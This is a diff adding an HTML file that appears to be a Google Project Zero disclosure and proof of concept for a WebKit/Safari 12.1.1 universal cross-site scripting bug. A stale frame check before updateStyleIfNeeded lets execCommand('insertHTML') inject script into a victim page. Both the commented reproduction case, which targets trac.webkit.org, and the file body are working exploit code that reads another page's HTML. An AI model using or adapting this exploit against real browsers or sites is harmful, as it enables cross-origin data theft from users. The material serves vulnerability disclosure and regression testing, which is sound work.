@@ -1,0 +1,146 @@
+<!--
+VULNERABILITY DETAILS
+```
+static Editor::Command command(Document* document, const String& commandName, bool userInterface = false)
+{
+    RefPtr<Frame> frame = document->frame();
+    if (!frame || frame->document() != document) // ***1***
+        return Editor::Command();
+
+    document->updateStyleIfNeeded(); // ***2***
+
+    return frame->editor().command(commandName,
+        userInterface ? CommandFromDOMWithUserInterface : CommandFromDOM);
+}
+
+bool Document::execCommand(const String& commandName, bool userInterface, const String& value)
+{
+    EventQueueScope eventQueueScope;
+    return command(this, commandName, userInterface).execute(value);
+}
+```
+
+This bug is similar to https://bugs.chromium.org/p/project-zero/issues/detail?id=1133. `command`
+calls `updateStyleIfNeeded`[2], which might trigger JavaScript execution, e.g., via
+`HTMLObjectElement::updateWidget`. If the JS code triggers a new page load, the editor command will
+be applied to the wrong page. The method checks that the `document` argument is the document that's
+currently displayed on the page, but it does so *before* the `updateStyleIfNeeded` call. An attacker
+can exploit this bug to execute the "InsertHTML" command and run JavaScript in the context of the
+victim page.
+
+
+VERSION
+WebKit revision 246194
+Safari version 12.1.1 (14607.2.6.1.1)
+
+
+REPRODUCTION CASE
+The test case requires the victim page to have a selected element when the load is complete. A
+common suitable case is when the page contains an autofocused <input> element.
+
+```
+<body>
+<script>
+function createURL(data, type = 'text/html') {
+    return URL.createObjectURL(new Blob([data], {type: type}));
+}
+
+function waitForLoad() {
+  showModalDialog(createURL(`
+    <script>
+    let it = setInterval(() => {
+      try {
+        opener.w.document.x;
+      } catch (e) {
+        clearInterval(it);
+
+        window.close();
+      }
+    }, 100);
+    </scrip` + 't>'));
+}
+
+victim_url = 'https://trac.webkit.org/search';
+
+cache_frame = document.body.appendChild(document.createElement('iframe'));
+cache_frame.src = victim_url;
+cache_frame.style.display = 'none';
+
+onclick = () => {
+  w = open();
+
+  obj = document.createElement('object');
+  obj.data = 'about:blank';
+  obj.addEventListener('load', function() {
+    a = w.document.createElement('a');
+    a.href = victim_url;
+    a.click();
+
+    waitForLoad();
+  });
+  w.document.body.appendChild(obj);
+
+  w.document.execCommand('insertHTML', false,
+    '<iframe onload="alert(document.documentElement.outerHTML)" src="about:blank"></iframe>');
+}
+</script>
+</body>
+```
+
+repro_iframe.html contains a version that uses an <iframe> instead of a new window and works in
+Safari 12.1.1.
+
+
+CREDIT INFORMATION
+Sergei Glazunov of Google Project Zero
+-->
+
+<body>
+<script>
+function createURL(data, type = 'text/html') {
+  return URL.createObjectURL(new Blob([data], {type: type}));
+}
+
+function waitForLoad() {
+  showModalDialog(createURL(`
+    <script>
+    let it = setInterval(() => {
+      try {
+        opener.w.document.x;
+      } catch (e) {
+        clearInterval(it);
+
+        window.close();
+      }
+    }, 100);
+    </scrip` + 't>'));
+}
+
+
+victim_url = 'data:text/html,<h1>secret data</h1><input autofocus>';
+
+cache_frame = document.body.appendChild(document.createElement('iframe'));
+cache_frame.src = victim_url;
+cache_frame.style.display = 'none';
+
+victim_frame = document.body.appendChild(document.createElement('iframe'));
+victim_frame.style.width = victim_frame.style.height = '100%';
+victim_frame.contentDocument.write('<h1>click to start</h1>');
+
+victim_frame.contentWindow.onclick = (() => {
+  obj = document.createElement('object');
+  obj.data = 'about:blank';
+  obj.addEventListener('load', function() {
+    a = victim_frame.contentDocument.createElement('a');
+    a.href = victim_url;
+    a.click();
+
+    waitForLoad();
+  });
+  victim_frame.contentDocument.body.appendChild(obj);
+
+  victim_frame.contentDocument.execCommand('insertHTML', false,
+    '<iframe onload="alert(document.firstChild.outerHTML)" src="about:blank"></iframe>');
+});
+</script>
+</body>
